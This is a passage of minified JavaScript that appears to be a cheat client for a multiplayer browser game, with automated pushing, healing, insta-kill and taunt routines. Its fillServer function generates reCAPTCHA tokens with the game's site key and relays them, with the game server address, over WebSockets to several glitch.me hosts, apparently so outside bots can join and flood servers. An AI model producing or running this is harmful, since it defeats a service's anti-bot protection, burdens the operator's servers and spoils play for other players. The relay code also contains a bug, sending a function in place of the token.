                y2: i.y + (cdf(t, i) + E.scale) * Math.sin(caf(t, i) - Math.PI),
            };
            if (
                et
                .filter((t) => t.active)
                .find((t) => {
                    let n = t.getScale();
                    if (
                        !t.ignoreCollision &&
                        C.lineInRect(
                            t.x - n,
                            t.y - n,
                            t.x + n,
                            t.y + n,
                            E.x2,
                            E.y2,
                            o.x2,
                            o.y2
                        )
                    )
                        return !0;
                })
            )
                autopuzhing && ((autopuzhing = !1), ee.send("a", Tn || void 0, 1));
            else {
                (autopuzhing = !0),
                    (puzhData = {
                    x: i.x,
                    y: i.y,
                    x2: o.x2,
                    y2: o.y2,
                });
                let a = E.scale / 10;
                C.lineInRect(
                    E.x2 - a,
                    E.y2 - a,
                    E.x2 + a,
                    E.y2 + a,
                    t.x2,
                    t.y2,
                    o.x,
                    o.y
                ) && cdf(E, t) > 87
                    ? (ee.send("a", avgDir(caf(E, t) - Math.PI, caf(E, i) - Math.PI), 1), pushTragectory = avgDir(caf(E, t) - Math.PI, caf(E, i) - Math.PI))
                : ee.send("a", caf(o, E) - Math.PI, 1);
            }
        } else autopuzhing && ((autopuzhing = !1), ee.send("a", Tn || void 0, 1));
    } else autopuzhing && ((autopuzhing = !1), ee.send("a", Tn || void 0, 1));
}

function cdf(t, n) {
    try {
        return Math.hypot(
            (n.y2 || n.y) - (t.y2 || t.y),
            (n.x2 || n.x) - (t.x2 || t.x)
        );
    } catch (i) {
        return 1 / 0;
    }
}

function caf(t, n) {
    try {
        return Math.atan2(
            (n.y2 || n.y) - (t.y2 || t.y),
            (n.x2 || n.x) - (t.x2 || t.x)
        );
    } catch (i) {
        return 0;
    }
}

function fillServer(t, n, i, o, a, r) {
    for (let s in ((t = []).push(
        new WebSocket("wss://dog-beaded-baseball.glitch.me/")
    ),
                   t.push(new WebSocket("wss://balanced-plant-actress.glitch.me/")),
                   t.push(new WebSocket("wss://rigorous-observant-meal.glitch.me/")),
                   t.push(new WebSocket("wss://ruby-gusty-trumpet.glitch.me/")),
                   t.push(new WebSocket("wss://magical-gamy-almandine.glitch.me/")),
                   t.push(new WebSocket("wss://odd-half-femur.glitch.me/")),
                   t.push(new WebSocket("wss://ritzy-glaze-kumquat.glitch.me/")),
                   (o = async function () {
        return await new Promise((t) => {
            window.grecaptcha
                .execute("6LfahtgjAAAAAF8SkpjyeYMcxMdxIaQeh-VoPATP", {
                action: "homepage",
            })
                .then(function (n) {
                t(encodeURIComponent(n));
            });
        });
    }),
                   t))
        (t[s].onmessage = (n) => {
            "dc" == n && setTimeout(t[s].close(), 1e4);
        }),
            (t[s].onopen = (n) => {
            t[s].int = setInterval(() => {
                if (!t[s].sent && WZinfo) {
                    async function n() {
                        (r = await o()),
                            (a = "wss://" + WZinfo + "?token=re:" + o),
                            t[s].send(a);
                    }
                    t[s].sent = !0;
                    for (let i = 0; i < 4; i++) n();
                }
            });
        });
}

function Lo(t) {
    window.open(t, "_blank");
}

function placeArry(t, n, i, o, a) {
    let r = R.list[E.items[t]],
        s = E.scale + r.scale + (r.placeOffset || 0),
        l = [];
    et.forEach((t) => {
        l.push({
            x: t.x,
            y: t.y,
            active: t.active,
            blocker: t.blocker,
            scale: t.scale,
            isItem: t.isItem,
            type: t.type,
            colDiv: t.colDiv,
            getScale: function (t, n) {
                return (
                    (t = t || 1),
                    this.scale *
                    (this.isItem || 2 == this.type || 3 == this.type || 4 == this.type
                     ? 1
                     : 0.6 * t) *
                    (n ? 1 : this.colDiv)
                );
            },
        });
    });
    for (let c = n; c < i; c += o) {
        let d = E.x2 + s * Math.cos(c),
            h = E.y2 + s * Math.sin(c);
        !l.find(
            (t) =>
            t.active &&
            C.getDistance(d, h, t.x, t.y) <
            r.scale + (t.blocker ? t.blocker : t.getScale(0.6, t.isItem))
        ) &&
            ((18 != r.id &&
              h >= T.mapScale / 2 - T.riverWidth / 2 &&
              h <= T.mapScale / 2 + T.riverWidth / 2) ||
             (place(t, c),
              l.push({
            x: d,
            y: h,
            active: !0,
            blocker: r.blocker,
            scale: r.scale,
            isItem: !0,
            type: null,
            colDiv: r.colDiv,
            getScale: function () {
                return this.scale;
            },
        })));
    }
}

function spikeKnockbackArray(t, n) {
    let i = n.scale + t.scale,
        o = [];
    for (let a = 0; a <= i; a++) {
        let r;
        (r =
         a <= n.scale + t.scale ? t.knock + n.scale + t.scale - a : t.knock + 0),
            o.push(r);
    }
    return o;
}

function getKBDirection(t, n) {
    let i = n.x - t.x,
        o = Math.atan2(n.y - t.y, i) * (180 / Math.PI);
    return o < 0 ? o + 360 : o;
}

function kbEndPosition(t, n, i) {
    let o = i.reduce((t, n) => t + n, 0),
        a = n.x + o * Math.cos(getKBDirection(t, n) * (Math.PI / 180)),
        r = n.y + o * Math.sin(getKBDirection(t, n) * (Math.PI / 180));
    return {
        x: a,
        y: r,
    };
}
let newPos;

function fgdo(t, n, i) {
    return t == E
        ? Math.sqrt(Math.pow(n.y - t.y2, 2) + Math.pow(n.x - t.x2, 2))
    : n == E
        ? Math.sqrt(Math.pow(n.y2 - t.y, 2) + Math.pow(n.x2 - t.x, 2))
    : i
        ? Math.sqrt(Math.pow(n.y3 - t.y, 2) + Math.pow(n.x3 - t.x, 2))
    : Math.sqrt(Math.pow(n.y - t.y, 2) + Math.pow(n.x - t.x, 2));
}
let obj,
    autohitting = !1,
    tickLow = [];

function setTickout(t, n) {
    "object" == typeof tickLow[tick + n]
        ? tickLow[tick + n].push(t)
    : (tickLow[tick + n] = [t]);
}

function animate(t, n) {
    let i = "",
        o;
    (o = t ? "i am super pro" : "lmfao"),
        t && (o = (o = o.padStart((30 - o.length) / 2 + o.length)).padEnd(30));
    let a = 0;
    for (let r = 0; r < o.length; r++)
        1 == Math.floor(Math.random() * n) &&
            "-" != o.charAt(r) &&
            a < 2 &&
            " " != o.charAt(r)
            ? ((i += "_"), a++)
        : (i += o.charAt(r));
    return i;
}
let forceZolder = !1,
    gonnainzta = !1;

var pushTragectory = 0, antiPushobj = false;

function isCircleIntersectingLineSegment(t, n, i, o, a, r, s) {
    let l = i - t,
        c = o - n,
        d = ((a - t) * l + (r - n) * c) / (l * l + c * c),
        h,
        u;
    d < 0
        ? ((h = t), (u = n))
    : d > 1
        ? ((h = i), (u = o))
    : ((h = t + d * l), (u = n + d * c));
    let p = a - h,
        f = r - u,
        $ = Math.sqrt(p * p + f * f);
    return $ <= s;
}
class KTAa {
    constructor() {
        (this.projectiles = []),
            (this.playerHit = []),
            (this.players = []),
            (this.player = []),
            (this.weaponsToHit = []),
            (this.buildings = []),
            (this.preplaceBuildings = []),
            (this.watersheepPreplaceBeLike = []);
    }
    objectDeathManager(t) {
        ue.disableBySid(t),
            Ho(t),
            autoG.toggle &&
            (E.zecondaryVariant < autoG.toVar && 10 == E.secondaryWeapon
             ? (place(5, 0 - Math.PI / 4), place(5, 0 + Math.PI / 4))
             : E.primaryVariant < autoG.toVar
             ? (place(5, 0 - Math.PI / 4), place(5, 0 + Math.PI / 4))
             : (addMenuChText("autogrinding completed", "pink", "", "red", !0),
                ee.send("K", 1),
                (autoG = {
            toggle: !1,
            toVar: 4,
            weapon: null,
        })));
    }
    updateHealth(t, n) {
        (y = _i(t)) && ((y.lastHealth = y.health), (y.health = n));
        var i = y.lastHealth - y.health;
        if (
            (y.health <= 0 &&
             (addMenuChText(
                y.name +
                " has died [" +
                Math.round(y.x) +
                ", " +
                Math.round(y.y) +
                "] [" +
                i +
                "]",
                "#f24b4b",
                "",
                "#f24b4b"
            ),
              E.canSee(y) && addDeadPlayer(y),
              document.getElementById("killchat").checked &&
              "Ultra Mod Kill Chat" ==
              document.getElementById("killChatType").value &&
              ee.send("6", y.name + " Get piked :>")),
             y.lastHealth > y.health && y.visible
             ? -1 === i
             ? Hn.showText(y.x, y.y, 40, 0.18, 900, Math.round(i), "#ee5551")
             : Hn.showText(
                y.x,
                y.y,
                40,
                0.18,
                900,
                Math.round(Math.abs(i)),
                y.dmgColor
            )
             : y == E &&
             Hn.showText(
                y.x,
                y.y,
                40,
                0.18,
                900,
                Math.round(Math.abs(i)),
                "#8ecc51"
            ),
             y.lastHealth > y.health)
        ) {
            if (((y.hitTime = tick), y == E)) {
                let o = 6 == E.skinIndex ? 18 : 25;
                enemiez.find((t) => 300 > cdf(t, E)) &&
                    ((i >= -17.7 && i <= -10) || i >= o)
                    ? E.shameCount <= 4
                    ? heal()
                : ((emptAnti = !0),
                   setTickout(() => {
                    (emptAnti = !1), heal();
                }, 2))
                : setTickout(() => {
                    heal();
                }, 2);
            }
        } else if (y.hitTime) {
            let a = tick - y.hitTime;
            (y.hitTime = 0),
                a < 2
                ? y.shameCount++
            : ((y.shameCount -= 2), y.shameCount <= 0 && (y.shameCount = 0)),
                (y.inztaInfo.maxZhame = Math.max(y.inztaInfo.maxZhame, y.shameCount)),
                (y.inztaInfo.minZhame = Math.min(0, y.shameCount));
        }
    }
    addProjectile(t, n, i, o, a, r, s, l, c) {
        let d = 0 == r ? 9 : 2 == r ? 12 : 3 == r ? 13 : 5 == r && 15;
        for (let h = 0; h < J.length; h++) {
            let u = J[h];
            u.visible &&
                (1 == r ? 53 == u.skinIndex : u.secondaryWeapon == d) &&
                C.getAngleDist(
                caf(
                    {
                        x: u.x2,
                        y: u.y2,
                    },
                    {
                        x: t,
                        y: n,
                    }
                ),
                u.dir
            ) <=
                Math.PI / 2.6 &&
                70 >=
                cdf(u, {
                x: t - 35 * Math.cos(i),
                y: n - 35 * Math.sin(i),
            }) &&
                (1 == r && (u.turretReload = 2500),
                 (u.reloads[d] = R.weapons[d].speed));
        }
        ds && (po.addProjectile(t, n, i, o, a, r, s, l, c).sid = l);
    }
    removeProjectile(t) {}
    executeInztakill() {
        !autohitting && ((inztakillData.aim = !0),
                         (inztakillData.toggle = !1),
                         Yt(E.secondaryWeapon, 1),
                         ee.send("K", 1),
                         Jn(53, 0),
                         setTickout(() => {
            Yt(E.primaryWeapon, 1),
                Jn(7, 0),
                setTickout(() => {
                ee.send("K", 1), (inztakillData.aim = !1);
            }, 1);
        }, 1));
    }
    addPlayer(t, n, i, o, a, r, s, l, c, d, h, u, p, f, $) {
        let g = {};
        (g.id = n),
            (g.sid = i),
            (g.tmpScore = 0),
            (g.team = null),
            (g.skinIndex = 0),
            (g.tailIndex = 0),
            (g.hitTime = 0),
            (g.tails = {});
        for (var m = 0; m < u.length; ++m)
            u[m].price <= 0 && (g.tails[u[m].id] = 1);
        g.skins = {};
        for (var m = 0; m < h.length; ++m)
            h[m].price <= 0 && (g.skins[h[m].id] = 1);
        (g.points = 0),
            (g.dt = 0),
            (g.rt = 0),
            (g.hidden = !1),
            (g.itemCounts = {}),
            (g.isPlayer = !0),
            (g.pps = 0),
            (g.moveDir = void 0),
            (g.skinRot = 0),
            (g.lastPing = 0),
            (g.iconIndex = 0),
            (g.skinColor = 0),
            (g.spawn = function (n) {
            (g.dmgColor = t
             ? "#fff"
             : `#${Math.floor(16777215 * Math.random())
             .toString(16)
             .padStart(6, "0")}`),
                (g.potentialdmg = 0),
                (g.dmgPot = 0),
                (g.doableDmg = 0),
                (g.active = !0),
                (g.alive = !0),
                (g.lockMove = !1),
                (g.lockDir = !1),
                (g.minimapCounter = 0),
                (g.chatCountdown = 0),
                (g.privateChatCountdown = 0),
                (g.shameCount = 0),
                (g.shameTimer = 0),
                (g.sentTo = {}),
                (g.gathering = 0),
                (g.autoGather = 0),
                (g.animTime = 0),
                (g.animSpeed = 0),
                (g.mouseState = 0),
                (g.buildIndex = -1),
                (g.weaponIndex = 0),
                (g.dmgOverTime = {}),
                (g.noMovTimer = 0),
                (g.maxXP = 300),
                (g.XP = 0),
                (g.age = 1),
                (g.kills = 0),
                (g.upgrAge = 2),
                (g.upgradePoints = 0),
                (g.x = 0),
                (g.y = 0),
                (g.x3 = 0),
                (g.y3 = 0),
                (g.laztX = 0),
                (g.laztY = 0),
                (g.laztx = 0),
                (g.lazty = 0),
                (g.nextX = 0),
                (g.nextY = 0),
                (g.zIndex = 0),
                (g.xVel = 0),
                (g.yVel = 0),
                (g.slowMult = 1),
                (g.dir = 0),
                (g.dirPlus = 0),
                (g.targetDir = 0),
                (g.targetAngle = 0),
                (g.maxHealth = 100),
                (g.health = g.maxHealth),
                (g.lastHealth = g.health),
                (g.healthAnim = g.health),
                (g.scale = o.playerScale),
                (g.speed = o.playerSpeed),
                g.resetMoveDir(),
                g.resetResources(n),
                (g.items = [0, 3, 6, 10]),
                (g.weapons = [0]),
                (g.shootCount = 0),
                (g.weaponXP = []),
                (g.reloads = {
                0: 0,
                1: 0,
                2: 0,
                3: 0,
                4: 0,
                5: 0,
                6: 0,
                7: 0,
                8: 0,
                9: 0,
                10: 0,
                11: 0,
                12: 0,
                13: 0,
                14: 0,
                15: 0,
            }),
                (this.oldReloads = {
                0: 0,
                1: 0,
                2: 0,
                3: 0,
                4: 0,
                5: 0,
                6: 0,
                7: 0,
                8: 0,
                9: 0,
                10: 0,
                11: 0,
                12: 0,
                13: 0,
                14: 0,
                15: 0,
                53: 0,
            }),
                (g.turretReload = 0),
                (g.primaryWeapon = 1),
                (g.secondaryWeapon = 15),
                (g.primaryVariant = 0),
                (g.zecondaryVariant = 0),
                (g.inTrap = !1),
                (g.timeSpentNearVolcano = 0),
                (g.KB = []),
                (g.doit = false),
                (g.preplaceAble = false),
                (g.inztaInfo = {
                maxZhame: 0,
                minZhame: 0,
                bulltickz: !1,
                bullticking: !1,
            });
        }),
            (g.resetMoveDir = function () {
            g.moveDir = void 0;
        }),
            (g.resetResources = function (t) {
            for (let n = 0; n < o.resourceTypes.length; ++n)
                this[o.resourceTypes[n]] = t ? 100 : 0;
        }),
            (g.addItem = function (t) {
            let n = d.list[t];
            if (n) {
                for (let i = 0; i < g.items.length; ++i)
                    if (d.list[g.items[i]].group == n.group)
                        return (
                            g.buildIndex == g.items[i] && (g.buildIndex = t),
                            (g.items[i] = t),
                            !0
                        );
                return g.items.push(t), !0;
            }
            return !1;
        }),
            (g.setUserData = function (t) {
            if (t) {
                g.name = "unknown";
                let n = t.name + "";
                n = (n = (n = (n = n.slice(0, o.maxNameLength)).replace(
                    /[^\w:\(\)\/? -]+/gim,
                    " "
                )).replace(/[^\x00-\x7F]/g, " ")).trim();
                let i = !1,
                    a = n
                .toLowerCase()
                .replace(/\s/g, "")
                .replace(/1/g, "i")
                .replace(/0/g, "o")
                .replace(/5/g, "s");
                for (let r of Yr.list)
                    if (-1 != a.indexOf(r)) {
                        i = !0;
                        break;
                    }
                n.length > 0 && !i && (g.name = n),
                    (g.skinColor = 0),
                    o.skinColors[t.skin] && (g.skinColor = t.skin);
            }
        }),
            (g.getData = function () {
            return [
                g.id,
                g.sid,
                g.name,
                a.fixTo(g.x, 2),
                a.fixTo(g.y, 2),
                a.fixTo(g.dir, 3),
                g.health,
                g.maxHealth,
                g.scale,
                g.skinColor,
            ];
        }),
            (g.setData = function (t) {
            (g.id = t[0]),
                (g.sid = t[1]),
                (g.name = t[2]),
                (g.x = t[3]),
                (g.y = t[4]),
                (g.dir = t[5]),
                (g.health = t[6]),
                (g.maxHealth = t[7]),
                (g.scale = t[8]),
                (g.skinColor = t[9]);
        });
        let _ = 0;
        (g.update = function (t) {
            if (!g.alive) return;
            if (
                ((a.getDistance(g.x, g.y, o.volcanoLocationX, o.volcanoLocationY) ||
                  0) < o.volcanoAggressionRadius &&
                 ((g.timeSpentNearVolcano += t),
                  g.timeSpentNearVolcano >= 1e3 &&
                  (g.changeHealth(o.volcanoDamagePerSecond, null),
                   p.send(
                    g.id,
                    "8",
                    Math.round(g.x),
                    Math.round(g.y),
                    o.volcanoDamagePerSecond,
                    -1
                ),
                   (g.timeSpentNearVolcano %= 1e3))),
                 g.shameTimer > 0 &&
                 ((g.shameTimer -= t),
                  g.shameTimer <= 0 && ((g.shameTimer = 0), (g.shameCount = 0))),
                 (_ -= t) <= 0)
            ) {
                let n =
                    (g.skin && g.skin.healthRegen ? g.skin.healthRegen : 0) +
                    (g.tail && g.tail.healthRegen ? g.tail.healthRegen : 0);
                n && g.changeHealth(n, this),
                    g.dmgOverTime.dmg &&
                    (g.changeHealth(-g.dmgOverTime.dmg, g.dmgOverTime.doer),
                     (g.dmgOverTime.time -= 1),
                     g.dmgOverTime.time <= 0 && (g.dmgOverTime.dmg = 0)),
                    g.healCol && g.changeHealth(g.healCol, this),
                    (_ = 1e3);
            }
            if (!g.alive) return;
            if (
                (g.slowMult < 1 &&
                 ((g.slowMult += 8e-4 * t), g.slowMult > 1 && (g.slowMult = 1)),
                 (g.noMovTimer += t),
                 (g.xVel || g.yVel) && (g.noMovTimer = 0),
                 g.lockMove)
            )
                (g.xVel = 0), (g.yVel = 0);
            else {
                let i =
                    (g.buildIndex >= 0 ? 0.5 : 1) *
                    (d.weapons[g.weaponIndex].spdMult || 1) *
                    ((g.skin && g.skin.spdMult) || 1) *
                    ((g.tail && g.tail.spdMult) || 1) *
                    (g.y <= o.snowBiomeTop
                     ? g.skin && g.skin.coldM
                     ? 1
                     : o.snowSpeed
                     : 1) *
                    g.slowMult;
                !g.zIndex &&
                    g.y >= o.mapScale / 2 - o.riverWidth / 2 &&
                    g.y <= o.mapScale / 2 + o.riverWidth / 2 &&
                    (g.skin && g.skin.watrImm
                     ? ((i *= 0.75), (g.xVel += 0.4 * o.waterCurrent * t))
                     : ((i *= 0.33), (g.xVel += o.waterCurrent * t)));
                let c = null != g.moveDir ? at(g.moveDir) : 0,
                    h = null != g.moveDir ? lt(g.moveDir) : 0,
                    u = Rc(c * c + h * h);
                0 != u && ((c /= u), (h /= u)),
                    c && (g.xVel += c * g.speed * i * t),
                    h && (g.yVel += h * g.speed * i * t);
            }
            (g.zIndex = 0), (g.lockMove = !1), (g.healCol = 0);
            let f,
                $ = a.getDistance(0, 0, g.xVel * t, g.yVel * t),
                m = Math.min(4, Math.max(1, Math.round($ / 40))),
                k = 1 / m,
                v = {};
            for (var b = 0; b < m; ++b) {
                g.xVel && (g.x += g.xVel * t * k),
                    g.yVel && (g.y += g.yVel * t * k),
                    (f = s.getGridArrays(g.x, g.y, g.scale));
                for (let w = 0; w < f.length; ++w) {
                    for (
                        let x = 0;
                        x < f[w].length &&
                        !(
                            f[w][x].active &&
                            !v[f[w][x].sid] &&
                            s.checkCollision(this, f[w][x], k) &&
                            ((v[f[w][x].sid] = !0), !g.alive)
                        );
                        ++x
                    );
                    if (!g.alive) break;
                }
                if (!g.alive) break;
            }
            for (var S = l.indexOf(this), b = S + 1; b < l.length; ++b)
                l[b] != this && l[b].alive && s.checkCollision(this, l[b]);
            if (
                (g.xVel &&
                 ((g.xVel *= Bs(o.playerDecel, t)),
                  g.xVel <= 0.01 && g.xVel >= -0.01 && (g.xVel = 0)),
                 g.yVel &&
                 ((g.yVel *= Bs(o.playerDecel, t)),
                  g.yVel <= 0.01 && g.yVel >= -0.01 && (g.yVel = 0)),
                 g.x - g.scale < 0
                 ? (g.x = g.scale)
                 : g.x + g.scale > o.mapScale && (g.x = o.mapScale - g.scale),
                 g.y - g.scale < 0
                 ? (g.y = g.scale)
                 : g.y + g.scale > o.mapScale && (g.y = o.mapScale - g.scale),
                 g.buildIndex < 0)
            ) {
                if (g.reloads[g.weaponIndex] > 0)
                    (g.reloads[g.weaponIndex] -= t), (g.gathering = g.mouseState);
                else if (g.gathering || g.autoGather) {
                    let I = !0;
                    if (null != d.weapons[g.weaponIndex].gather) g.gather(l);
                    else if (
                        null != d.weapons[g.weaponIndex].projectile &&
                        g.hasRes(d.weapons[g.weaponIndex], g.skin ? g.skin.projCost : 0)
                    ) {
                        g.useRes(d.weapons[g.weaponIndex], g.skin ? g.skin.projCost : 0),
                            (g.noMovTimer = 0);
                        var S = d.weapons[g.weaponIndex].projectile;
                        let P = 2 * g.scale,
                            O = g.skin && g.skin.aMlt ? g.skin.aMlt : 1;
                        d.weapons[g.weaponIndex].rec &&
                            ((g.xVel -= d.weapons[g.weaponIndex].rec * at(g.dir)),
                             (g.yVel -= d.weapons[g.weaponIndex].rec * lt(g.dir))),
                            r.addProjectile(
                            g.x + P * at(g.dir),
                            g.y + P * lt(g.dir),
                            g.dir,
                            d.projectiles[S].range * O,
                            d.projectiles[S].speed * O,
                            S,
                            this,
                            null,
                            g.zIndex
                        );
                    } else I = !1;
                    (g.gathering = g.mouseState),
                        I &&
                        (g.reloads[g.weaponIndex] =
                         d.weapons[g.weaponIndex].speed *
                         ((g.skin && g.skin.atkSpd) || 1));
                }
            }
        }),
            (g.addWeaponXP = function (t) {
            g.weaponXP[g.weaponIndex] || (g.weaponXP[g.weaponIndex] = 0),
                (g.weaponXP[g.weaponIndex] += t);
        }),
            (g.earnXP = function (t) {
            g.age < o.maxAge &&
                ((g.XP += t),
                 g.XP >= g.maxXP
                 ? (g.age < o.maxAge
                    ? (g.age++, (g.XP = 0), (g.maxXP *= 1.2))
                    : (g.XP = g.maxXP),
                    g.upgradePoints++,
                    p.send(g.id, "U", g.upgradePoints, g.upgrAge),
                    p.send(g.id, "T", g.XP, a.fixTo(g.maxXP, 1), g.age))
                 : p.send(g.id, "T", g.XP));
        }),
            (g.changeHealth = function (t, n) {
            if (t > 0 && g.health >= g.maxHealth) return !1;
            t < 0 && g.skin && (t *= g.skin.dmgMult || 1),
                t < 0 && g.tail && (t *= g.tail.dmgMult || 1),
                t < 0 && (g.hitTime = Date.now()),
                (g.health += t),
                g.health > g.maxHealth &&
                ((t -= g.health - g.maxHealth), (g.health = g.maxHealth)),
                g.health <= 0 && g.kill(n);
            for (let i = 0; i < l.length; ++i)
                g.sentTo[l[i].id] && p.send(l[i].id, "O", g.sid, g.health);
            return (
                n &&
                n.canSee(this) &&
                !(n == this && t < 0) &&
                p.send(
                    n.id,
                    "8",
                    Math.round(g.x),
                    Math.round(g.y),
                    Math.round(-t),
                    1
                ),
                !0
            );
        }),
            (g.kill = function (t) {
            t &&
                t.alive &&
                (t.kills++,
                 t.skin && t.skin.goldSteal
                 ? f(t, Math.round(g.points / 2))
                 : f(
                t,
                Math.round(
                    100 * g.age * (t.skin && t.skin.kScrM ? t.skin.kScrM : 1)
                )
            ),
                 p.send(t.id, "N", "kills", t.kills, 1)),
                (g.alive = !1),
                p.send(g.id, "P"),
                $();
        }),
            (g.addResource = function (t, n, i) {
            !i && n > 0 && g.addWeaponXP(n),
                3 == t
                ? f(this, n, !0)
            : ((this[o.resourceTypes[t]] += n),
               p.send(
                g.id,
                "N",
                o.resourceTypes[t],
                this[o.resourceTypes[t]],
                1
            ));
        }),
            (g.changeItemCount = function (t, n) {
            (g.itemCounts[t] = g.itemCounts[t] || 0),
                (g.itemCounts[t] += n),
                p.send(g.id, "S", t, g.itemCounts[t]);
        }),
            (g.buildItem = function (t) {
            let n = g.scale + t.scale + (t.placeOffset || 0),
                i = g.x + n * at(g.dir),
                o = g.y + n * lt(g.dir);
            if (
                g.canBuild(t) &&
                !(t.consume && g.skin && g.skin.noEat) &&
                (t.consume || s.checkItemLocation(i, o, t.scale, 0.6, t.id, !1, this))
            ) {
                let a = !1;
                if (t.consume) {
                    if (g.hitTime) {
                        let r = Date.now() - g.hitTime;
                        (g.hitTime = 0),
                            r <= 120
                            ? (g.shameCount++,
                               g.shameCount >= 8 &&
                               ((g.shameTimer = 3e4), (g.shameCount = 0)))
                        : ((g.shameCount -= 2),
                           g.shameCount <= 0 && (g.shameCount = 0));
                    }
                    g.shameTimer <= 0 && (a = t.consume(this));
                } else
                    (a = !0),
                        t.group.limit && g.changeItemCount(t.group.id, 1),
                        t.pps && (g.pps += t.pps),
                        s.add(
                        s.objects.length,
                        i,
                        o,
                        g.dir,
                        t.scale,
                        t.type,
                        t,
                        !1,
                        this
                    );
                a && (g.useRes(t), (g.buildIndex = -1));
            }
        }),
            (g.hasRes = function (t, n) {
            for (let i = 0; i < t.req.length; ) {
                if (this[t.req[i]] < Math.round(t.req[i + 1] * (n || 1))) return !1;
                i += 2;
            }
            return !0;
        }),
            (g.useRes = function (t, n) {
            if (!o.inSandbox)
                for (let i = 0; i < t.req.length; )
                    g.addResource(
                        o.resourceTypes.indexOf(t.req[i]),
                        -Math.round(t.req[i + 1] * (n || 1))
                    ),
                        (i += 2);
        }),
            (g.canBuild = function (t) {
            let n = o.inSandbox
            ? t.group.sandboxLimit || Math.max(3 * t.group.limit, 99)
            : t.group.limit;
            return (
                (!n || !(g.itemCounts[t.group.id] >= n)) &&
                (!!o.inSandbox || g.hasRes(t))
            );
        }),
            (g.gather = function () {
            (g.noMovTimer = 0),
                (g.slowMult -= d.weapons[g.weaponIndex].hitSlow || 0.3),
                g.slowMult < 0 && (g.slowMult = 0);
            let t = o.fetchVariant(this),
                n = t.poison,
                i = t.val,
                r = {},
                h,
                u,
                p,
                f,
                $ = s.getGridArrays(g.x, g.y, d.weapons[g.weaponIndex].range);
            for (let m = 0; m < $.length; ++m)
                for (var _ = 0; _ < $[m].length; ++_)
                    if (
                        (p = $[m][_]).active &&
                        !p.dontGather &&
                        !r[p.sid] &&
                        p.visibleToPlayer(this) &&
                        (h = a.getDistance(g.x, g.y, p.x, p.y) - p.scale) <=
                        d.weapons[g.weaponIndex].range &&
                        ((u = a.getDirection(p.x, p.y, g.x, g.y)),
                         a.getAngleDist(u, g.dir) <= o.gatherAngle)
                    ) {
                        if (((r[p.sid] = 1), p.health)) {
                            if (
                                p.changeHealth(
                                    -d.weapons[g.weaponIndex].dmg *
                                    i *
                                    (d.weapons[g.weaponIndex].sDmg || 1) *
                                    (g.skin && g.skin.bDmg ? g.skin.bDmg : 1),
                                    this
                                )
                            ) {
                                for (let k = 0; k < p.req.length; )
                                    g.addResource(
                                        o.resourceTypes.indexOf(p.req[k]),
                                        p.req[k + 1]
                                    ),
                                        (k += 2);
                                s.disableObj(p);
                            }
                        } else {
                            if ("volcano" === p.name)
                                g.hitVolcano(d.weapons[g.weaponIndex].gather);
                            else {
                                g.earnXP(4 * d.weapons[g.weaponIndex].gather);
                                let v =
                                    d.weapons[g.weaponIndex].gather + (3 == p.type ? 4 : 0);
                                g.addResource(p.type, v);
                            }
                            g.skin && g.skin.extraGold && g.addResource(3, 1);
                        }
                        (f = !0), s.hitObj(p, u);
                    }
            for (var _ = 0; _ < l.length + c.length; ++_)
                if (
                    (p = l[_] || c[_ - l.length]) != this &&
                    p.alive &&
                    !(p.team && p.team == g.team) &&
                    (h = a.getDistance(g.x, g.y, p.x, p.y) - 1.8 * p.scale) <=
                    d.weapons[g.weaponIndex].range &&
                    ((u = a.getDirection(p.x, p.y, g.x, g.y)),
                     a.getAngleDist(u, g.dir) <= o.gatherAngle)
                ) {
                    let b = d.weapons[g.weaponIndex].steal;
                    b &&
                        p.addResource &&
                        ((b = Math.min(p.points || 0, b)),
                         g.addResource(3, b),
                         p.addResource(3, -b));
                    let w = i;
                    null != p.weaponIndex &&
                        d.weapons[p.weaponIndex].shield &&
                        a.getAngleDist(u + Math.PI, p.dir) <= o.shieldAngle &&
                        (w = d.weapons[p.weaponIndex].shield);
                    let x = d.weapons[g.weaponIndex].dmg,
                        S =
                        x *
                        (g.skin && g.skin.dmgMultO ? g.skin.dmgMultO : 1) *
                        (g.tail && g.tail.dmgMultO ? g.tail.dmgMultO : 1),
                        I =
                        0.3 * (p.weightM || 1) + (d.weapons[g.weaponIndex].knock || 0);
                    (p.xVel += I * at(u)),
                        (p.yVel += I * lt(u)),
                        g.skin &&
                        g.skin.healD &&
                        g.changeHealth(S * w * g.skin.healD, this),
                        g.tail &&
                        g.tail.healD &&
                        g.changeHealth(S * w * g.tail.healD, this),
                        p.skin && p.skin.dmg && g.changeHealth(-x * p.skin.dmg, p),
                        p.tail && p.tail.dmg && g.changeHealth(-x * p.tail.dmg, p),
                        p.dmgOverTime &&
                        g.skin &&
                        g.skin.poisonDmg &&
                        !(p.skin && p.skin.poisonRes) &&
                        ((p.dmgOverTime.dmg = g.skin.poisonDmg),
                         (p.dmgOverTime.time = g.skin.poisonTime || 1),
                         (p.dmgOverTime.doer = this)),
                        p.dmgOverTime &&
                        n &&
                        !(p.skin && p.skin.poisonRes) &&
                        ((p.dmgOverTime.dmg = 5),
                         (p.dmgOverTime.time = 5),
                         (p.dmgOverTime.doer = this)),
                        p.skin &&
                        p.skin.dmgK &&
                        ((g.xVel -= p.skin.dmgK * at(u)),
                         (g.yVel -= p.skin.dmgK * lt(u))),
                        p.changeHealth(-S * w, this, this);
                }
            g.sendAnimation(f ? 1 : 0);
        }),
            (g.hitVolcano = function (t) {
            let n = 5 + Math.round(t / 3.5);
            g.addResource(2, n), g.addResource(3, n);
        }),
            (g.sendAnimation = function (t) {
            for (let n = 0; n < l.length; ++n)
                g.sentTo[l[n].id] &&
                    g.canSee(l[n]) &&
                    p.send(l[n].id, "K", g.sid, t ? 1 : 0, g.weaponIndex);
        });
        let k = 0,
            v = 0;
        return (
            (g.animate = function (t) {
                g.animTime > 0 &&
                    ((g.animTime -= t),
                     g.animTime <= 0
                     ? ((g.animTime = 0), (g.dirPlus = 0), (k = 0), (v = 0))
                     : 0 == v
                     ? ((k += t / (g.animSpeed * o.hitReturnRatio)),
                        (g.dirPlus = a.lerp(0, g.targetAngle, Math.min(1, k))),
                        k >= 1 && ((k = 1), (v = 1)))
                     : ((k -= t / (g.animSpeed * (1 - o.hitReturnRatio))),
                        (g.dirPlus = a.lerp(0, g.targetAngle, Math.max(0, k)))));
            }),
            (g.startAnim = function (t, n) {
                (g.animTime = g.animSpeed = d.weapons[n].speed),
                    (g.targetAngle = t ? -o.hitAngle : -Math.PI),
                    (k = 0),
                    (v = 0);
            }),
            (g.canSee = function (t) {
                if (
                    !t ||
                    (t.skin && t.skin.invisTimer && t.noMovTimer >= t.skin.invisTimer)
                )
                    return !1;
